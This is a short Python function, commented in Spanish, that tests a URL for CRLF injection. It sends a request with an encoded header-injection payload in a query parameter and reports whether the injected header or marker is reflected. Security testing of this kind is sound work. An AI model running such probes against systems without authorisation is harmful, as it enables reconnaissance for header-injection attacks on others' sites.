import requests

def crlf_injection(url, param_name="input"):
    print(f"\n[+] Probando inyección CRLF en: {url} usando parámetro '{param_name}'\n")

    # Payload clásico de CRLF
    payload = "%0d%0aInjected-Header: crlf_test"

    target = f"{url}?{param_name}={payload}"

    try:
        response = requests.get(target, timeout=10)

        # Buscamos si el header se refleja en la respuesta
        headers_text = str(response.headers)

        if "Injected-Header" in headers_text:
            print(f"   ✔ Posible CRLF detectado: cabecera inyectada con éxito.")
        elif "crlf_test" in response.text:
            print(f"   ✔ Posible CRLF reflejado en el cuerpo HTML.")
        else:
            print(f"   ✘ No se detectó CRLF en {param_name}={payload}")

    except Exception as e:
        print(f"   [!] Error al probar CRLF: {e}")
